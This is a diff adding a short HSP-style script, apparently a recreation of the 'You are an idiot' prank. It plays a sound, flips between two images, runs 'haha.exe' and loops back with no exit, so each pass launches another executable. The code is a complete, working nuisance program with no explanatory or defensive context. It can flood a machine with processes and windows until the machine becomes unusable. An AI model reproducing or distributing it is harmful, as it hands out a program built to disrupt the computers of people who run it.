@@ -1,0 +1,19 @@
+title "you are an idiot"
+*you
+mmload "you.wav"
+mmplay 0
+wait 70
+picload "you1.jpg"
+wait 70
+picload "you2.jpg"
+wait 70
+picload "you1.jpg"
+wait 70
+picload "you2.jpg"
+wait 70
+picload "you1.jpg"
+wait 70
+picload "you2.jpg"
+wait 70
+exec "haha.exe"
+goto *you
